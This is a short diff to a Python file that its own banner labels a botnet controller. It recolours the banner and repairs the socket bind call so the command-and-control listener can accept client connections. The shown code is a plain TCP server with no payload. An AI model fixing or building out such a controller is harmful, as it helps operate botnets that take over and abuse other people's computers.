@@ -14,7 +14,7 @@ class Controller(object):
     @staticmethod
     def show_banner(s):
         for c in s + '\n':
-            sys.stdout.write(bg.BLACK + Fore.WHITE + c)
+            sys.stdout.write(bg.BLACK + Fore.GREEN + c)
             sys.stdout.flush()
             time.sleep(2. / 100)
     def listen(self):
@@ -24,7 +24,7 @@ class Controller(object):
         buffer_size = buffer_values(10240,1024)
         SEPARATOR = "<sep>"
         s = socket.socket()
-        s.bind(server_ip,server_port)
+        s.bind((server_ip,int(server_port)))
         s.listen(5)
         print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
         client_socket, client_address = s.accept()
@@ -54,4 +54,3 @@ Bot-Net Controller -> By AL104 & Droid
     banner.join()
     listener.start()
     listener.join()
-
